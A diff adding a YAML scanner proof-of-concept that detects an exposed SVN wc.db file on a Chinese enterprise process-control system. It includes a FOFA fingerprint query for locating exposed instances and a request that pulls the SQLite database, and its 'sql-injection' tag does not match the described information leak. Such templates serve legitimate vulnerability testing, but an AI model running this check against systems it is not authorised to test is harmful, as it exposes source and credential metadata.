@@ -1,0 +1,15 @@
+id: poc-yaml-skzy-wc-db-information-leak
+info:
+  name: 时空智友企业流程化管控系统 wc.db 信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: 时空智友企业流程化管控系统
+  fofa: body="企业流程化管控系统"
+requests:
+- method: GET
+  path: /.svn/wc.db
+  expression: status_code == 200 && contains(body,"SQLite format 3") && contains(body,`svn://svn`)
+    && contains(body,"md5")
+variables: {}
+transport: http
